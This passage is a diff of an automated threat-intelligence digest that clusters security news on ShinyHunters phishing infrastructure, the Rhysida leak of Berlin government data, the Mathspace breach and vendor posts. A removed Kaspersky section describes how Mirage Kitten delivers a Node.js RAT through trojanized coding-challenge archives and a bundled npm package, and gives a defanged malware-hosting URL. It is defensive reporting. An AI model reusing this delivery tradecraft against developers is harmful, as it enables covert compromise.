the visible piece, but it is rarely the whole picture. Hosting providers, ASN usage, TLS behavior, passive DNS history, certificates, and exposed services can show how the operation is being staged. In this case, Push identified Mevspace AS201814 as the hosting provider for Cluster A. They also documented the Cluster A naming patterns, including: <target>internal.com <target>sso.com my<target>.com my<target>internal.com my<target>manager.com my<target>sso.com Using those patterns as a starting point, Scout surfaced active infrastructure consistent with the same cluster. Confirming Cluster A on Mevspace Push identified Mevspace AS201814 as the Cluster A hosting provider but did not publish IP-level indicators. Starting from the hosting provider and domain naming criteria, a single Scout query returned three results: asn="201814" pdns.domain="*internal.com,*sso.com" Scout query result for Mevspace AS201814 with the Cluster A domain pattern Figure 1: Scout returns three IPs for the Mevspace AS201814 plus *internal.com,*sso.com query. Two of them,
 ```
 
-#### Corroborating sources (3)
+#### Corroborating sources (2)
 
 - **Team Cymru** (ransomware_ecrime_financial_crime)
   - Title: Behind the Panels: Validating ShinyHunters Cluster A Infrastructure Through Network Telemetry
   - Published: 2026-09-04T13:13:53+00:00
   - Link: https://www.team-cymru.com/post/validating-shinyhunters-cyber-threat-actors-infrastructure
   - Summary: Use network telemetry to validate cyber threat actors' phishing infrastructure. Track ShinyHunters clusters and defend against SaaS data exfiltration.
-- **Infosecurity Magazine** (cyber_news_breach_reporting)
-  - Title: Healthcare Giant McKesson Investigates Data Breach Incident
-  - Published: 2026-09-01T08:25:00+00:00
-  - Link: https://www.infosecurity-magazine.com/news/healthcare-mckesson-investigates/
-  - Summary: ShinyHunters claims to have stolen 284 million records from McKesson
 - **Dark Reading** (cyber_news_breach_reporting)
   - Title: What We Missed: Did ShinyHunters 'Breach' ReliaQuest?
   - Published: 2026-09-03T19:42:39+00:00
@@ -2022,49 +2107,6 @@ FILTER BY YEAR 2026 2025 2024 2023 2022 2021 2020 2019 2018 2017 2016 7th Septem
   - Published: 2026-09-07T14:54:29+00:00
   - Link: https://research.checkpoint.com/2026/7th-september-threat-intelligence-report/
   - Summary: For the latest discoveries in cyber research for the week of 7th Setpember, please download our Threat Intelligence Bulletin. TOP ATTACKS AND BREACHES Thomson Reuters, a global information and technology company, has disclosed a breach of its C-Track court case-management platform affecting courts across 11 US states and Canada. An unauthorized party obtained C-Track files […] The post 7th September – Threat Intelligence Report appeared first on Check Point Research .
-
-### Cluster 0e8b249098 — score 11
-
-- Title: Introducing Continuous Vulnerability Assessment: Real-Time Defense for the AI Threat Era
-- Source: Wiz Research (cloud_identity_infrastructure)
-- Published: 2026-09-01T10:54:43+00:00
-- Link: https://www.wiz.io/blog/introducing-cva
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- threat_categories: active_exploitation
-- urgency_signals: actively_exploited
-- content_type: vulnerability_disclosure
-- confidence_tier: tier_2_operator
-
-#### Primary article taxonomy
-- threat_categories: active_exploitation
-- urgency_signals: actively_exploited
-- content_type: vulnerability_disclosure
-- confidence_tier: tier_2_operator
-
-#### Summary
-
-```
-Detect exposure to new vulnerabilities the moment they are published with Wiz CVA
-```
-
-#### Full body
-
-```
-We are excited to introduce Wiz's Continuous Vulnerability Assessment (CVA) - a fundamentally new operating model for vulnerability scanning that helps teams keep up in the AI Threat Era. Today, the window between "vulnerability published" and "actively exploited" is shrinking fast - and teams that rely on scheduled scanning are left exposed. Wiz CVA solves this by providing real-time visibility into your exposure to vulnerabilities as soon as they are published. Wiz now updates our vulnerability catalog the moment a new vulnerability is discovered, and immediately reassesses your exposure to it- without having to wait for the next scheduled scan. CVA ensures findings are available in near-real-time, enabling teams to detect exposure, prioritize with context, and remediate on the same day a vulnerability is published, not days later. The Challenge: Exploitation Is Moving Faster Than Ever Attackers are exploiting newly published vulnerabilities faster than ever before - in many cases within hours of public disclosure. AI has accelerated this significantly, enabling threat actors to identify affected targets and develop working exploits at a speed that was not possible by humans alone. The most critical window attackers look to exploit is precisely this gap - between the moment a vulnerability is published and the moment an organization finds the exposure and removes it. For security teams, this means they need to act fast: teams need to know where they are exposed as close to the moment of disclosure as possible, with a clear path to remediation from day one. CVA and CTEM: Continuous Exposure Management in Practice Continuous Threat Exposure Management (CTEM) is the security industry's answer to this challenge - a framework that moves organizations from periodic, point-in-time assessments to a continuous cycle of discovery, prioritization, and remediation. At its core, CTEM requires that your exposure picture is always current, not days or weeks stale - and increasingly, it is also the foundation for AI threat readiness: if your detection and response capabilities can't operate at the speed AI-assisted attacks move, you're already behind. This shift is now being mandated at the regulatory level: following CISA BOD 26-04 , FedRAMP released new guidance requiring organizations to move away from scheduled scanning toward a continuous, exposure-and-threat-based approach to vulnerability detection and remediation. Wiz has been building toward a complete CTEM solution across the platform - from cloud and code risk discovery, extending to on-prem with UVM, ASM validation enhanced with the Red Agent, and Green Agent accelerating response. CVA completes the picture for vulnerability management: it is the mechanism that ensures the "Discovery" phase of CTEM operates continuously, not on a schedule. For teams adopting or maturing a CTEM program, CVA is the operational foundation that makes continuous exposure management real. From Real-Time Detection to Remediation Surfacing a vulnerability quickly is the first step, but responding fast and knowing how to act is the key. Once CVA surfaces a finding, Wiz's Green Agent (the Resolution Agent) extends remediation to machine-speed. It provides the remediation guidance, ownership context, and root cause context needed to move from finding to fix efficiently, without having to track down asset owners or piece together generic patch documentation. The Impact of CVA Together, CVA and the Wiz platform deliver measurable improvements across the metrics that matter most: Reduced MTTD - Mean Time to Detect aligned with vulnerability publication, in near-real-time Reduced MTTR - Right owners get the context and guided remediation they need to act immediately, with Wiz Workflows automating response at scale Stronger AI threat readiness and CTEM posture - Continuous detection closes the exposure window that fast-moving, AI-assisted attacks rely on Get Started with Wiz CVA Continuous Vulnerability Assessm
-```
-
-#### Corroborating sources (1)
-
-- **Wiz Research** (cloud_identity_infrastructure)
-  - Title: Introducing Continuous Vulnerability Assessment: Real-Time Defense for the AI Threat Era
-  - Published: 2026-09-01T10:54:43+00:00
-  - Link: https://www.wiz.io/blog/introducing-cva
-  - Summary: Detect exposure to new vulnerabilities the moment they are published with Wiz CVA
 
 ### Cluster b1ece38bbc — score 11
 
@@ -2434,18 +2476,20 @@ Discover the alarming rise in compromised organizations since January. Learn how
 - Strong signals: Rhysida
 
 #### Cluster taxonomy (union across members)
-- threat_categories: ransomware_extortion
-- actor_attribution: Rhysida, Scattered Spider
+- threat_categories: ransomware_extortion, zero_day
+- actor_attribution: Lazarus, Rhysida, Scattered Spider
 - affected_industries: government, healthcare, legal_professional
 - affected_products: Snowflake
+- urgency_signals: zero_day
 - content_type: incident_report
 - confidence_tier: tier_4_news
 
 #### Primary article taxonomy
-- threat_categories: ransomware_extortion
-- actor_attribution: Scattered Spider, Rhysida
+- threat_categories: ransomware_extortion, zero_day
+- actor_attribution: Scattered Spider, Rhysida, Lazarus
 - affected_industries: healthcare, government, legal_professional
 - affected_products: Snowflake
+- urgency_signals: zero_day
 - content_type: incident_report
 - confidence_tier: tier_4_news
 
@@ -2458,7 +2502,7 @@ The ransomware group’s published dataset reportedly includes Berlin state empl
 #### Full body
 
 ```
-Infosecurity Magazine Home » News » Rhysida Publishes Berlin Government Data After €2m Extortion Demand Refused Rhysida Publishes Berlin Government Data After €2m Extortion Demand Refused News 7 September 2026 Written by James Coker Deputy Editor , Infosecurity Magazine Follow @ReporterCoker Berlin’s state government has confirmed that the Rhysida ransomware gang has published a stolen dataset on the dark web, after it refused to pay the threat actor’s extortion demand. The State of Berlin said Rhysida had demanded 30 bitcoins, equivalent to €2m, to not publicly release data it had stolen from its network, giving a deadline of Friday, September 4 for payment to be made. However, the state government emphasized that it will not give in to extortion attempts. In a statement published on its official website on September 4, the authority wrote: “The ultimatum issued by the hacker group Rhysida following its cyber-attack on Berlin’s state network expired on Friday afternoon. According to experts, the entire dataset was published on the dark web.” Rhysida claimed to have accessed approximately 5.7 TB, and the State of Berlin had warned in an earlier announcement on September 4 that the personal data of employees, as well as to citizens and businesses, may be affected. It added that there are currently “no indications” the state network remains compromised. IT forensic experts are currently analyzing the stolen dataset, and authorities will contact all individuals affected once this process has been completed. “If individual affected persons are identified during the analysis, they will be notified by the relevant Senate departments on a risk-based basis and in accordance with legal requirements,” a statement from the Senate Chancellery read. Any Berlin citizen who discovers that their personal data has been published has also been urged to report the matter to law enforcement. Florian Hauer, chief digital officer for the State of Berlin, commented: “The State of Berlin will not give in to blackmail. The safety of the State of Berlin’s staff and the people of Berlin is our top priority.” Sensitive State Disaster Plans Reportedly Exposed Rhysida has reportedly published the entire 5.7 TB dataset, encompassing around 1.4 million files. Euronews has reported that the leak includes highly sensitive state emergency plans relating to terrorist attacks and other disaster scenarios, contained in a folder titled "AG CBRN-Rahmenplanung." CBRN stands for chemical, biological, radiological and nuclear threats. Rhysida also claims the dataset contains personal information of tens of thousands of people. These include personnel files of state workers, such as absence lists, payroll data and home addresses. The Rhysida ransomware-as-a-service (RaaS) operation was first observed in May 2023, and has frequently targeted public institutions and critical services. The threat actor has been linked to a string of attacks on US healthcare providers, including Cookeville Regional Medical Center (CRMC) in Tennessee in 2025, which resulted in the compromise of more than 337,000 patients’ data. A Rhysida affiliate was also behind the high-profile ransomware attack on the British Library in 2023, which suffered huge disruption and recovery costs after refusing the attacker’s extortion demands. You may also like Barts Health Seeks High Court Ban After Oracle EBS Breach News 8 December 2025 Scattered Spider-Linked Group Claims JLR Cyber-Attack News 4 September 2025 Over Half a Million Hit by Pennsylvania Schools Union Breach News 20 March 2025 Threat Actor Breaches Snowflake Customers, Victims Extorted News 11 June 2024 Coinbase Breach Affected Almost 70,000 Customers News 22 May 2025 What’s Hot on Infosecurity Magazine? Read Shared Watched Editor's Choice FBI Probes Possible Breach of 153 Million Driver’s Licenses News 3 September 2026 1 US and Canadian Court Records Breached Following Thomson Reuters Incident News 3 September 2026 2 Pegasus Zero-Click Exploit
+Infosecurity Magazine Home » News » Rhysida Publishes Berlin Government Data After €2m Extortion Demand Refused Rhysida Publishes Berlin Government Data After €2m Extortion Demand Refused News 7 September 2026 Written by James Coker Deputy Editor , Infosecurity Magazine Follow @ReporterCoker Berlin’s state government has confirmed that the Rhysida ransomware gang has published a stolen dataset on the dark web, after it refused to pay the threat actor’s extortion demand. The State of Berlin said Rhysida had demanded 30 bitcoins, equivalent to €2m, to not publicly release data it had stolen from its network, giving a deadline of Friday, September 4 for payment to be made. However, the state government emphasized that it will not give in to extortion attempts. In a statement published on its official website on September 4, the authority wrote: “The ultimatum issued by the hacker group Rhysida following its cyber-attack on Berlin’s state network expired on Friday afternoon. According to experts, the entire dataset was published on the dark web.” Rhysida claimed to have accessed approximately 5.7 TB, and the State of Berlin had warned in an earlier announcement on September 4 that the personal data of employees, as well as to citizens and businesses, may be affected. It added that there are currently “no indications” the state network remains compromised. IT forensic experts are currently analyzing the stolen dataset, and authorities will contact all individuals affected once this process has been completed. “If individual affected persons are identified during the analysis, they will be notified by the relevant Senate departments on a risk-based basis and in accordance with legal requirements,” a statement from the Senate Chancellery read. Any Berlin citizen who discovers that their personal data has been published has also been urged to report the matter to law enforcement. Florian Hauer, chief digital officer for the State of Berlin, commented: “The State of Berlin will not give in to blackmail. The safety of the State of Berlin’s staff and the people of Berlin is our top priority.” Sensitive State Disaster Plans Reportedly Exposed Rhysida has reportedly published the entire 5.7 TB dataset, encompassing around 1.4 million files. Euronews has reported that the leak includes highly sensitive state emergency plans relating to terrorist attacks and other disaster scenarios, contained in a folder titled "AG CBRN-Rahmenplanung." CBRN stands for chemical, biological, radiological and nuclear threats. Rhysida also claims the dataset contains personal information of tens of thousands of people. These include personnel files of state workers, such as absence lists, payroll data and home addresses. The Rhysida ransomware-as-a-service (RaaS) operation was first observed in May 2023, and has frequently targeted public institutions and critical services. The threat actor has been linked to a string of attacks on US healthcare providers, including Cookeville Regional Medical Center (CRMC) in Tennessee in 2025, which resulted in the compromise of more than 337,000 patients’ data. A Rhysida affiliate was also behind the high-profile ransomware attack on the British Library in 2023, which suffered huge disruption and recovery costs after refusing the attacker’s extortion demands. You may also like Barts Health Seeks High Court Ban After Oracle EBS Breach News 8 December 2025 Scattered Spider-Linked Group Claims JLR Cyber-Attack News 4 September 2025 Over Half a Million Hit by Pennsylvania Schools Union Breach News 20 March 2025 Threat Actor Breaches Snowflake Customers, Victims Extorted News 11 June 2024 Coinbase Breach Affected Almost 70,000 Customers News 22 May 2025 What’s Hot on Infosecurity Magazine? Read Shared Watched Editor's Choice Researcher Publishes CrowdStrike Privilege Escalation Zero Day News 7 September 2026 1 Multiple Class Action Lawsuits Filed Against IDScan News 7 September 2026 2 North Korea’s Lazarus Operates Through Six Di
 ```
 
 #### Corroborating sources (1)
@@ -2706,51 +2750,6 @@ Table of Contents Introduction Technical details Delivery Installation Communica
   - Link: https://securelist.com/toy-ghouls-new-hivemq-and-element-backdoors/121270/
   - Summary: Kaspersky GERT experts have discovered new backdoors used by the Toy Ghouls group. One version of the backdoor uses the HiveMQ MQTT broker as its command-and-control server; the other uses the Matrix-based Element messenger.
 
-### Cluster 0a5e1245be — score 10
-
-- Title: Mirage Kitten targeting aviation and FinTech sectors across the Middle East and Africa with a new malware set
-- Source: Kaspersky Securelist (threat_research_primary)
-- Published: 2026-09-01T07:00:26+00:00
-- Link: https://securelist.com/mirage-kitten-new-backdoors-noderabbit-pollcat/121244/
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- threat_categories: apt_espionage, phishing_social_eng
-- affected_industries: aviation_defense, financial_services
-- affected_products: Apple iOS/macOS, npm
-- content_type: news_report
-- confidence_tier: tier_1_primary_research
-
-#### Primary article taxonomy
-- threat_categories: phishing_social_eng, apt_espionage
-- affected_industries: financial_services, aviation_defense
-- affected_products: npm, Apple iOS/macOS
-- content_type: news_report
-- confidence_tier: tier_1_primary_research
-
-#### Summary
-
-```
-Kaspersky researchers have discovered new Mirage Kitten attacks using previously undocumented malware families: NodeRabbit in Node.js and PollCat in JavaScript.
-```
-
-#### Full body
-
-```
-Table of Contents Background Initial access NodeRabbit RAT: the first variant NodeRabbit RAT: the second variant NodeRabbit RAT: the third variant 1. Malicious VS Code extension 2. Git hook injection PollCat RAT Infrastructure Victims Attribution Conclusions Indicators of compromise File hashes Domains and IPs Authors Omar Amin While monitoring Mirage Kitten activity, we uncovered a previously undocumented malware family that we dubbed NodeRabbit. We identified the first sample on a system in Afghanistan. Further threat hunting revealed two additional, more advanced, variants: one on a system in Egypt and another on a system in Ethiopia. NodeRabbit is a cross-platform remote access trojan (RAT) built with Node.js. It targets Windows, Linux, and macOS. Its operators deliver it through spear-phishing messages on LinkedIn and other job search platforms that contain trojanized coding challenge archives. During the same investigation, we discovered another previously undocumented malware family that we dubbed PollCat. Like NodeRabbit, PollCat is a cross-platform RAT, but it is written in obfuscated JavaScript also distributed through trojanized coding challenge archives. Mirage Kitten has historically relied on native malware written in languages such as C, C++, and Go, often deploying it through DLL search-order hijacking. NodeRabbit and PollCat represent the first publicly documented use of Node.js- and JavaScript-based malware by this APT group. Kaspersky’s products detect this threat as Trojan.JS.MirageKitten.* Background During recent threat research, we detected suspicious activity on a system in Afghanistan. We traced it to an archive containing a software development project that the user may have received during a job application process. The archive purported to contain a coding challenge for candidates applying for an engineering role. The archive, Front-Technical-Challenge.zip (MD5: 1EA83E4E4592B01E4ACAB63EB867BEE5 ), was hosted in an Amazon S3 bucket at: https://oracle-challenge.s3[.]us-east-1.amazonaws[.]com/Front-Technical-Challenge.zip It contained TaskFlow, an app for software engineering assessment built with Express, React, and Vite. The accompanying README instructed the candidate to review the application and fix defects in its frontend. It also claimed that server.js was bug-free and should not be modified, conveniently directing attention away from the only application source file the attackers had altered. README file for a trojanized coding challenge app The README also imposed a three-hour time limit and prohibited the use of AI assistants. Notably, an AI code-review assistant tasked with auditing the project would likely have flagged the suspicious first-line import of an unknown npm package and warned the targeted developer that the project was trojanized. Rules and time limit included in the trojanized coding challenge app README file The first line of server.js imported a trojanized npm package named colorized_terminal , version 2.1.0 . The attackers bundled the package directly in the challenge task archive’s node_modules directory rather than publishing it to the npm registry. When imported, the package silently launched an implant from node_modules/.cache/.320697f1/index.js as a detached background process. Retrospective threat hunting across our telemetry revealed the broader scope of the campaign. We identified three NodeRabbit variants with a shared code lineage; each was recovered from a system in a different country. The operators delivered the variants through similarly themed coding challenges and used two trojanized packages, colorized_terminal and pretty-log , both pinned to version 2.1.0 . The campaign also delivered PollCat, a second RAT with a substantially different structure, through a separate coding challenge lure. We’ll analyze PollCat later in this research. Initial access The infection chain begins with fake recruiter accounts contacting prospective targets on a job search platfor
-```
-
-#### Corroborating sources (1)
-
-- **Kaspersky Securelist** (threat_research_primary)
-  - Title: Mirage Kitten targeting aviation and FinTech sectors across the Middle East and Africa with a new malware set
-  - Published: 2026-09-01T07:00:26+00:00
-  - Link: https://securelist.com/mirage-kitten-new-backdoors-noderabbit-pollcat/121244/
-  - Summary: Kaspersky researchers have discovered new Mirage Kitten attacks using previously undocumented malware families: NodeRabbit in Node.js and PollCat in JavaScript.
-
 ### Cluster bbea7197be — score 10
 
 - Title: Gaming the system: how a Chinese-speaking actor turned Brazilian government sites into an SEO weapon
@@ -2795,6 +2794,47 @@ CATEGORIES AI Research 19 Android Malware 23 Artificial Intelligence 5 ChatGPT 3
   - Published: 2026-09-02T10:16:16+00:00
   - Link: https://research.checkpoint.com/2026/gaming-the-system-how-a-chinese-speaking-actor-turned-brazilian-government-sites-into-an-seo-weapon/
   - Summary: Research by: Amit Yardeni Key Points Introduction Since mid-2025, Check Point Research has tracked a sustained campaign against Brazilian organizations. The tradecraft points to a Chinese-speaking cybercrime group connected to Earth Berberoka, an actor first documented targeting gambling sites across Asia. Once inside a victim, the group deploys a broad Linux toolkit: a custom downloader, several backdoors, […] The post Gaming the system: how a Chinese-speaking actor turned Brazilian government sites into an SEO weapon appeared first on Check Point Research .
+
+### Cluster 2e68cba663 — score 10
+
+- Title: The story behind the intelligence
+- Source: Cisco Talos (threat_research_primary)
+- Published: 2026-09-03T18:00:13+00:00
+- Link: https://blog.talosintelligence.com/the-story-behind-the-intelligence/
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- threat_categories: ransomware_extortion
+- content_type: news_report
+- confidence_tier: tier_1_primary_research
+
+#### Primary article taxonomy
+- threat_categories: ransomware_extortion
+- content_type: news_report
+- confidence_tier: tier_1_primary_research
+
+#### Summary
+
+```
+From engaging with cybercriminals to surviving a live Flamin’ Hot Cheetos taste test, Hazel reflects on the latest Beers with Talos with Azim, where they cover the full spectrum of what it takes to gather threat intel.
+```
+
+#### Full body
+
+```
+The story behind the intelligence By Hazel Burton Thursday, September 3, 2026 14:00 Threat Source newsletter Welcome to this week’s edition of the Threat Source newsletter. Our goal is to get accurate threat intelligence to our audience as quickly as possible, with all the context you need to ask the right questions of your own environment: How at risk are we from this threat? Are we prepared for it? And what can we do about it? What you don’t often see is all the... well, frankly, “mess” involved in producing it. All the dead ends we followed until we could confirm those ends were as dead as a doornail. All the work it took to ultimately produce an assessment, supported by evidence and written so that defenders can act on it. Much of that abstraction is necessary. Defenders need intelligence they can use, not a complete account of every conversation we had, or investigative detour behind it. But it can create an overly tidy picture of both cybercrime and the work required to understand it. If you do fancy a look behind the curtain, though, may I recommend our just-published episode of Beers with Talos ? Our guest is Azim Khodjibaev, whose remit is adversary engagement. His work involves developing personas for deep- and dark-web research, engaging directly with threat actors, and building relationships with people who may become (and have been) openly threatening to him. At one point, he was maintaining eight separate personas, some of which were interacting with one another. Azim’s engagements have helped Talos identify prolific cybercriminals and contributed to wider disruption efforts. They have also resulted in ransomware operators placing “Azim sucks” in their code and accusing him of belonging to the very criminal groups he was investigating. His experiences also expose the problem with treating adversaries as uniformly sophisticated operators. Some are technically capable and highly organised. Others are impulsive, ego-driven, or one-trick ponies. Many have a scary detachment from the consequences of their actions. Increasingly, Azim is seeing less-experienced threat actors working through loosely organised online collectives. Intelligence necessarily turns that disorder into something defenders can understand and use. But occasionally, it is worth looking behind the finished product – the patience it takes to get accurate answers, who we are investigating, and the deeply human behaviour that shapes both sides. This Beers with Talos episode, “Eight People Walk Into a Dark Web Forum. They’re All Azim,” isn’t exactly going to help many people in our industry sleep better at night. But for anyone wanting to understand more about the threat we’re up against, as a co-host of the pod I’m biased, but I believe it’s an essential listen. And if that doesn’t inspire you to download the episode, perhaps my live review of trying Flamin’ Hot Cheetos for the very first time (with a chaser of Nerds) will. The one big thing Cisco Talos is highlighting a growing operational hurdle for security teams that we call the AI "safety penalty." As frontier AI models advance, their built-in guardrails are increasingly blocking legitimate defensive tasks. This was evident in July 2026 when Hugging Face's primary cloud LLM refused to analyze forensic data during a breach, delaying their response. While defenders are slowed by these frustrating refusals, adversaries are freely leveraging unconstrained models to attack at machine speed. Why do I care? This guardrail asymmetry hands the advantage directly to attackers. When a cloud-hosted AI model refuses a forensic request mid-incident, defenders lose precious time. Security teams are paying for vendor-imposed limitations without gaining a capability edge, especially as open-weight alternatives close the reasoning gap. Ultimately, relying on third-party alignment policies means a sudden update in Silicon Valley could quietly break your defensive workflows overnight. So now what? Security leadership
+```
+
+#### Corroborating sources (1)
+
+- **Cisco Talos** (threat_research_primary)
+  - Title: The story behind the intelligence
+  - Published: 2026-09-03T18:00:13+00:00
+  - Link: https://blog.talosintelligence.com/the-story-behind-the-intelligence/
+  - Summary: From engaging with cybercriminals to surviving a live Flamin’ Hot Cheetos taste test, Hazel reflects on the latest Beers with Talos with Azim, where they cover the full spectrum of what it takes to gather threat intel.
 
 ### Cluster 396a583814 — score 10
 
@@ -2873,47 +2913,6 @@ CTEM Is Not About the Stages. It’s About the Outcome. Stephen Gates September 
   - Published: 2026-09-02T13:11:00+00:00
   - Link: https://horizon3.ai/intelligence/blogs/ctem-outcome-not-stages/
   - Summary: CTEM is not about filling five technology boxes. It is about continuously reducing exploitable exposure, proving remediation worked, and measuring whether the environment is becoming harder to attack.
-
-### Cluster 2e68cba663 — score 10
-
-- Title: The story behind the intelligence
-- Source: Cisco Talos (threat_research_primary)
-- Published: 2026-09-03T18:00:13+00:00
-- Link: https://blog.talosintelligence.com/the-story-behind-the-intelligence/
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- threat_categories: ransomware_extortion
-- content_type: news_report
-- confidence_tier: tier_1_primary_research
-
-#### Primary article taxonomy
-- threat_categories: ransomware_extortion
-- content_type: news_report
-- confidence_tier: tier_1_primary_research
-
-#### Summary
-
-```
-From engaging with cybercriminals to surviving a live Flamin’ Hot Cheetos taste test, Hazel reflects on the latest Beers with Talos with Azim, where they cover the full spectrum of what it takes to gather threat intel.
-```
-
-#### Full body
-
-```
-The story behind the intelligence By Hazel Burton Thursday, September 3, 2026 14:00 Threat Source newsletter Welcome to this week’s edition of the Threat Source newsletter. Our goal is to get accurate threat intelligence to our audience as quickly as possible, with all the context you need to ask the right questions of your own environment: How at risk are we from this threat? Are we prepared for it? And what can we do about it? What you don’t often see is all the... well, frankly, “mess” involved in producing it. All the dead ends we followed until we could confirm those ends were as dead as a doornail. All the work it took to ultimately produce an assessment, supported by evidence and written so that defenders can act on it. Much of that abstraction is necessary. Defenders need intelligence they can use, not a complete account of every conversation we had, or investigative detour behind it. But it can create an overly tidy picture of both cybercrime and the work required to understand it. If you do fancy a look behind the curtain, though, may I recommend our just-published episode of Beers with Talos ? Our guest is Azim Khodjibaev, whose remit is adversary engagement. His work involves developing personas for deep- and dark-web research, engaging directly with threat actors, and building relationships with people who may become (and have been) openly threatening to him. At one point, he was maintaining eight separate personas, some of which were interacting with one another. Azim’s engagements have helped Talos identify prolific cybercriminals and contributed to wider disruption efforts. They have also resulted in ransomware operators placing “Azim sucks” in their code and accusing him of belonging to the very criminal groups he was investigating. His experiences also expose the problem with treating adversaries as uniformly sophisticated operators. Some are technically capable and highly organised. Others are impulsive, ego-driven, or one-trick ponies. Many have a scary detachment from the consequences of their actions. Increasingly, Azim is seeing less-experienced threat actors working through loosely organised online collectives. Intelligence necessarily turns that disorder into something defenders can understand and use. But occasionally, it is worth looking behind the finished product – the patience it takes to get accurate answers, who we are investigating, and the deeply human behaviour that shapes both sides. This Beers with Talos episode, “Eight People Walk Into a Dark Web Forum. They’re All Azim,” isn’t exactly going to help many people in our industry sleep better at night. But for anyone wanting to understand more about the threat we’re up against, as a co-host of the pod I’m biased, but I believe it’s an essential listen. And if that doesn’t inspire you to download the episode, perhaps my live review of trying Flamin’ Hot Cheetos for the very first time (with a chaser of Nerds) will. The one big thing Cisco Talos is highlighting a growing operational hurdle for security teams that we call the AI "safety penalty." As frontier AI models advance, their built-in guardrails are increasingly blocking legitimate defensive tasks. This was evident in July 2026 when Hugging Face's primary cloud LLM refused to analyze forensic data during a breach, delaying their response. While defenders are slowed by these frustrating refusals, adversaries are freely leveraging unconstrained models to attack at machine speed. Why do I care? This guardrail asymmetry hands the advantage directly to attackers. When a cloud-hosted AI model refuses a forensic request mid-incident, defenders lose precious time. Security teams are paying for vendor-imposed limitations without gaining a capability edge, especially as open-weight alternatives close the reasoning gap. Ultimately, relying on third-party alignment policies means a sudden update in Silicon Valley could quietly break your defensive workflows overnight. So now what? Security leadership
-```
-
-#### Corroborating sources (1)
-
-- **Cisco Talos** (threat_research_primary)
-  - Title: The story behind the intelligence
-  - Published: 2026-09-03T18:00:13+00:00
-  - Link: https://blog.talosintelligence.com/the-story-behind-the-intelligence/
-  - Summary: From engaging with cybercriminals to surviving a live Flamin’ Hot Cheetos taste test, Hazel reflects on the latest Beers with Talos with Azim, where they cover the full spectrum of what it takes to gather threat intel.
 
 ### Cluster bb1555be83 — score 10
 
@@ -3148,6 +3147,102 @@ Vulnerabilities & Threats Application Security Cyber Risk Cybersecurity Operatio
   - Published: 2026-09-01T20:48:52+00:00
   - Link: https://www.darkreading.com/vulnerabilities-threats/critical-langflow-flaw-exploited-attacks-rise
   - Summary: The attacks targeting CVE-2026-0768 are the latest threat against the low-code AI development platform, which is receiving more attention from adversaries this year.
+
+### Cluster 1b8c4b752b — score 10
+
+- Title: Mathspace Data Breach Exposes Over 1 Million People
+- Source: SecurityWeek (cyber_news_breach_reporting)
+- Published: 2026-09-08T10:47:36+00:00
+- Link: https://www.securityweek.com/mathspace-data-breach-exposes-over-1-million-people/
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- threat_categories: active_exploitation, apt_espionage, data_breach, phishing_social_eng, ransomware_extortion, web_shell_backdoor, zero_day
+- actor_attribution: ShinyHunters
+- affected_products: OpenAI/ChatGPT, VMware, WordPress
+- cve_ids: CVE-2026-72898
+- urgency_signals: actively_exploited, zero_day
+- content_type: incident_report
+- confidence_tier: tier_4_news
+
+#### Primary article taxonomy
+- threat_categories: ransomware_extortion, phishing_social_eng, zero_day, data_breach, apt_espionage, web_shell_backdoor, active_exploitation
+- actor_attribution: ShinyHunters
+- affected_products: VMware, OpenAI/ChatGPT, WordPress
+- cve_ids: CVE-2026-72898
+- urgency_signals: actively_exploited, zero_day
+- content_type: incident_report
+- confidence_tier: tier_4_news
+
+#### Summary
+
+```
+Hackers stole the information of students, teachers, staff, and parents/guardians from a self-hosted Metabase instance. The post Mathspace Data Breach Exposes Over 1 Million People appeared first on SecurityWeek .
+```
+
+#### Full body
+
+```
+Mathspace, an online mathematics program for students, has disclosed a data breach that impacts over 1 million individuals. The incident, it says, was discovered last week, roughly three weeks after hackers compromised its self-hosted Metabase instance using a known vulnerability. The security defect, tracked as CVE-2026-72898 (CVSS score of 10/10) and described as an SQL injection issue, was patched on August 6 , after it had been exploited in the wild as a zero-day. Shortly after the patches were released, the notorious extortion group ShinyHunters claimed responsibility for hacking Metabase. Mathspace failed to escalate Metabase’s critical advisory to prioritize patching and upgraded its instance on August 29, more than two weeks after hackers hit it. “Our investigation identified unauthorised access dating back to 10 August 2026, Australian Eastern Standard Time. We confirmed that information was downloaded from our Australian reporting database on 27 August,” Mathspace says in an incident notice . Advertisement. Scroll to continue reading. Furthermore, Mathspace did not complete the compromise checks Metabase had recommended, and did not identify the intrusion upon applying the update. “We are investigating why the initial advisory was not escalated and why those checks were not completed sooner. We are changing both processes as part of our incident response,” the online platform says. Mathspace has taken its Metabase instance offline, revoked API keys, disabled the database access accounts, changed passwords, and exported the logs for investigation. The data breach impacts 1,079,819 students, teachers, staff, and parents/guardians from Australia and New Zealand. Hackers downloaded names, user IDs, usernames, email addresses, email verification status, time zone, country, date joined, and last login and active dates. “No academic records, learning activities, results, assessment records, passwords (hashes), authentication tokens, SSO credentials, or API credentials were exposed. The exposed data did not include records linking user accounts to their schools,” Mathspace says. The platform warns that the threat actors may use the stolen information to mount phishing attacks, urging the potentially affected individuals to treat with extreme caution any unsolicited communication containing accurate references to the incident. Mathspace reported the incident to the relevant authorities in Australia and, over the weekend, started notifying the potentially affected individuals. Related: Manchester Airports Group Data on 8.8 Million People Leaked After Ransom Refusal Related: 153 Million Driver License Images Offered on Dark Web Related: Ransomware Gang Claims Nutex Health Data Breach Related: 9.5 Million Impacted by Aesto Health Data Breach Written By Ionut Arghire Ionut Arghire is an international correspondent for SecurityWeek. Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing for the latest cybersecurity threats, trends, and expert insights. More from Ionut Arghire HPE Patches Critical RCE Vulnerabilities in AOS-CX Sangoma Switchvox Vulnerabilities Exploited in the Wild 12-Year-Old PostgreSQL Vulnerability Enables Database, Server Takeover VMware Workstation and Fusion Updates Patch Critical Vulnerability Google Patches 6th Chrome Zero-Day of 2026 Manchester Airports Group Data on 8.8 Million People Leaked After Ransom Refusal HiddenLayer Raises $100 Million for AI Runtime Security 153 